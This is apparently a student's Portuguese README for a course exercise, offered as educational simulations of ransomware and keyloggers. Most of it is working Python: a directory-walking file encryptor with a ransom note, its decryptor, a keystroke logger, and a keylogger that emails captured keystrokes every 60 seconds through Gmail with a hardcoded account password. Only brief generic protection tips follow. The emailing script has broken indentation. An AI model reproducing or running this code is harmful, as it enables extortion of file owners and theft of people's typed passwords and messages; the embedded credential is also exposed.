```markdown
# Simulação Educacional de Ransomware e Keylogger em Python 

## Entendendo o Desafio

Chegou a hora de colocar em prática todo o conhecimento que absorvi ao longo das aulas!
🚀Este projeto é a minha oportunidade de experimentar, compreender e documentar o funcionamento na pratica com os simulados com Python, em um ambiente 100% controlado e com fins educacionais.

A ideia foi implementar e registrar detalhadamente os exemplos apresentados no curso: Ransomware e Keylogger.
Esses exercícios mostraram, na prática, como essas ameaças digitais funcionam, como capturam ou sequestram dados, e principalmente como podemos detectar, mitigar e nos proteger delas no mundo real.

```
## Parte 1: Ransomware iniciando a criptografia dos dados

from cryptography.fernet import Fernet
import os

def gerar_chave():
    chave = Fernet.generate_key()
    with open("chave.key", "wb") as chave_file:
        chave_file.write(chave)

def carregar_chave():
    return open("chave.key", "rb").read()

def criptografar_arquivo(arquivo, chave):
    f = Fernet(chave)
    with open(arquivo, "rb") as file:
        dados = file.read()
    dados_encriptados = f.encrypt(dados)
    with open(arquivo, "wb") as file:
        file.write(dados_encriptados)

def encontrar_arquivos(diretorio):
    lista = []
    for raiz, _, arquivos in os.walk(diretorio):
        for nome in arquivos:
            caminho = os.path.join(raiz, nome)
            if nome != "ransomware.py" and not nome.endswith(".key"):
                lista.append(caminho)
    return lista

def criar_mensagem_resgate():
    with open("LEIA_ISSO.txt", "w") as f:
        f.write("Seus arquivos foram criptografados (simulação de aula)!\n")
        f.write("Este é apenas um exemplo educacional.\n")
        f.write("NUNCA execute scripts assim fora de ambiente seguro!\n")

def main():
    gerar_chave()
    chave = carregar_chave()
    arquivos = encontrar_arquivos("test_files")
    for arquivo in arquivos:
        criptografar_arquivo(arquivo, chave)
    criar_mensagem_resgate()
    print("Simulação executada! Arquivos criptografados.")

if __name__ == "__main__":
    main()

    

## Explicando o código
```
Neste código, inicialmente gero uma chave de criptografia segura e a salvo em um arquivo para uso posterior.
Depois, carrego essa chave para ser utilizada na criptografia dos arquivos.

A função `encontrar_arquivos` percorre o diretório de testes e reúne todos os arquivos que serão criptografados, exceto o próprio script e chave para evitar problemas.

Em seguida, cada arquivo encontrado é aberto, seu conteúdo é criptografado usando a chave e então sobrescrito com o conteúdo cifrado.

Por fim, uma mensagem de resgate educativa é criada, simulando o comportamento de um ransomware, e uma confirmação é exibida no console.

```
## Parte 2: Ransomware iniciando a descriptografia dos dados

from cryptography.fernet import Fernet
import os

def carregar_chave():
    return open("chave.key", "rb").read()

def descriptografar_arquivo(arquivo, chave):
    f = Fernet(chave)
    with open(arquivo, "rb") as file:
        dados = file.read()
    dados_descriptografados = f.decrypt(dados)
    with open(arquivo, "wb") as file:
        file.write(dados_descriptografados)

def encontrar_arquivos(diretorio):
    lista = []
    for raiz, _, arquivos in os.walk(diretorio):
        for nome in arquivos:
            caminho = os.path.join(raiz, nome)
            if nome != "ransomware.py" and not nome.endswith(".key"):
                lista.append(caminho)
    return lista

def main():
    chave = carregar_chave()
    arquivos = encontrar_arquivos("test_files")
    for arquivo in arquivos:
        descriptografar_arquivo(arquivo, chave)
    print("Arquivos restaurados com sucesso")

if __name__ == "__main__":
    main()

## Explicando o código
```
Aqui, a chave previamente gerada e salva é carregada para realizar a descriptografia.

Utilizando a mesma lógica de busca de arquivos, encontro todos os arquivos que haviam sido criptografados.

Cada arquivo é aberto, seu conteúdo cifrado é lido e, usando a chave, é revertido ao estado original, sobrescrevendo o arquivo com os dados restaurados.

Ao final, uma mensagem confirma a restauração bem sucedida dos arquivos.

```
## Parte 3: Keylogger iniciando a captura do teclado do usuário para obter os dados

from pynput import keyboard

IGNORAR = {
    keyboard.Key.shift,
    keyboard.Key.shift_r,
    keyboard.Key.alt_l,
    keyboard.Key.alt_r,
    keyboard.Key.ctrl_l,
    keyboard.Key.ctrl_r,
    keyboard.Key.caps_lock,
    keyboard.Key.cmd,
}

def on_press(key):
    try:
        with open("log.txt", "a", encoding="utf-8") as f:
            f.write(key.char)
    except AttributeError:
        with open("log.txt", "a", encoding="utf-8") as f:
            if key == keyboard.Key.space:
                f.write(" ")
            elif key == keyboard.Key.enter:
                f.write("\n")
            elif key == keyboard.Key.tab:
                f.write("\t")
            elif key == keyboard.Key.backspace:
                f.write("[BACKSPACE]")
            elif key == keyboard.Key.esc:
                f.write("[ESC]")
            elif key in IGNORAR:
                pass
            else:
                f.write(f"[{key}] ")

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()

## Explicando o código
```
Este código cria um keylogger simples que registra teclas digitadas em um arquivo log.txt.
A função on_press grava o caractere normal, ou, se a tecla for especial, escreve uma representação textual.
Teclas definidas em IGNORAR são ignoradas para evitar registro de modificadores como Shift ou Ctrl.

```
## Parte 4: Keylogger Recebendo por email as informações obtidas com a captura dos dados obtidas pelo teclado do usuário.

from pynput import keyboard
import smtplib
from email.mime.text import MIMEText
from threading import Timer

log = ""
EMAIL_ORIGEM = "teste2025@gmail.com"
EMAIL_DESTINO = "teste2025@gmail.com"
SENHA_EMAIL = "down mark olist http"

def enviar_email():
    global log
    if log:
        msg = MIMEText(log)
        msg['Subject'] = "dados capturados"
        msg['From'] = EMAIL_ORIGEM
        msg['To'] = EMAIL_DESTINO

   try:
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(EMAIL_ORIGEM, SENHA_EMAIL)
        server.send_message(msg)
        server.quit()
        except Exception as e:
        print("Erro ao enviar:", e)

  log = ""

  Timer(60, enviar_email).start()

def on_press(key):
    global log
    try:
        log += key.char
    except AttributeError:
        if key == keyboard.Key.space:
            log += " "
        elif key == keyboard.Key.enter:
            log += "\n"
        elif key == keyboard.Key.backspace:
            log += "[<]"


listener = keyboard.Listener(on_press=on_press)
listener.start()

enviar_email()

listener.join()



## Explicando o código
```
Este código captura teclas digitadas, armazena em log e envia seu conteúdo por e-mail a cada 60 segundos via SMTP do Gmail.
A função on_press registra caracteres normais e mapeia algumas teclas especiais para representações legíveis.
O listener captura as teclas continuamente, enquanto enviar_email dispara o envio periódico e limpa o log após cada envio.

```

## Dicas rápidas para se proteger de ransomware e keyloggers

Depois desse estudo, quero compartilhar o que aprendi pra ajudar todo mundo a evitar dores de cabeça com esses ataques:

- Tenha um antivírus bom e sempre atualizado, ele ajuda a bloquear vírus e malwares.
- Ative o firewall pra controlar o que entra e sai do seu computador.
- Só rode programas e arquivos que você confia, e, se tiver dúvida, use um ambiente seguro (sandbox).
- Faça backups regulares dos seus arquivos importantes e guarde eles longe do computador, tipo num HD externo.
- Fique esperto e não clique em links ou abra anexos estranhos, isso é regra básica!
- Mantenha o sistema e todos os programas atualizados, assim evita falhas que os hackers exploram.
- Use senhas fortes e diferentes pra cada conta, principalmente as mais importantes.

Seguindo isso, você já coloca uma boa trava contra esses ataques. Segurança sempre depende da gente também, então fique ligado!




